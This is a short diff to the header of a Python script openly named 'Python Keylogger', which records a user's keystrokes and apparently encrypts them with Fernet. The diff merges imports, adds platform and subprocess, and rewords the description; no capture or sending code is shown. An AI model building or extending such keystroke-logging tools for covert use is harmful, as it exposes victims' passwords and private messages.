@@ -1,15 +1,12 @@
-import keyboard
-import argparse
-import time
+import keyboard, argparse, time, base64, platform, subprocess
 from threading import Thread
-import base64
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 parser = argparse.ArgumentParser(
     prog="Python Keylogger",
-    description="Captures and stores the key presses of a user.",
+    description="Captures and stores the keystrokes of a user.",
     epilog="Do not use without permission from the targeted user."
 )
 
